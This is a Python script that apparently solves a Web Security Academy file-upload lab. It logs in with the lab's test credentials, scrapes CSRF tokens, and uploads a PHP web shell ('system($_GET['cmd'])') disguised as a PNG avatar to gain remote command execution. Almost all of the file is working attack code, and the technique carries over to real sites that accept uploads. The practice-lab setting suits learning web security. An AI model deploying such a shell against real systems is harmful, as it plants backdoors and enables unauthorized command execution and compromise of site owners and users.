import requests

DOMAIN = "0a0a00b9044c4b2c80e7d0e3003900af.web-security-academy.net"

HEADERS = {
    "Host": DOMAIN,
    "User-Agent": "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:123.0) Gecko/20100101 Firefox/123.0",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
    "Accept-Language": "en-US,en;q=0.5",
    "Accept-Encoding": "gzip, deflate, br",
    "Content-Type": "application/x-www-form-urlencoded",
    "Origin": f"https://{DOMAIN}",
    "Connection": "keep-alive",
    "Referer": f"https://{DOMAIN}/login",
    "Cookie": "session=LZly49g2aaudgvRjJMrmfsruqqG3gsa2",
    "Upgrade-Insecure-Requests": "1",
    "Sec-Fetch-Dest": "document",
    "Sec-Fetch-Mode": "navigate",
    "Sec-Fetch-Site": "same-origin",
    "Sec-Fetch-User": "?1",
    "TE": "trailers"
}

def get_csrf_token():
    response = requests.get(f"https://{DOMAIN}/login", headers=HEADERS)
    csrf_token = response.text.split('name="csrf" value="')[1].split('"')[0]
    HEADERS["Cookie"] = response.headers["Set-Cookie"].split(";")[0]
    return csrf_token

def login():
    csrf_token = get_csrf_token()
    data = {
        "csrf": csrf_token,
        "username": "wiener",
        "password": "peter"
    }
    response = requests.post(f"https://{DOMAIN}/login", headers=HEADERS, data=data, allow_redirects=False)

    if response.status_code == 302:
        print("Logged in successfully")
        HEADERS["Cookie"] = response.headers["Set-Cookie"]

def get_avatar_upload_csrf_token():
    response = requests.get(f"https://{DOMAIN}/my-account?id=wiener", headers=HEADERS)
    csrf_token = response.text.split('name="csrf" value="')[1].split('"')[0]
    return csrf_token

def upload_webshell():
    csrf_token = get_avatar_upload_csrf_token()

    files = {
        "avatar": ("GitHub.png", "<?php echo system($_GET['cmd']); ?>", "image/png"),
    }
    data = {
        "user": "wiener",
        "csrf": csrf_token,
    }

    response = requests.post(f"https://{DOMAIN}/my-account/avatar", headers=HEADERS, data=data, files=files)
    if response.status_code == 200 and "has been uploaded" in response.text:
        print("Webshell uploaded successfully")
    else:
        print(response.text)
        # print(response.request.body.decode("utf-8"))
        # print("Failed to upload webshell")
        # print(response.request.headers)

login()
upload_webshell()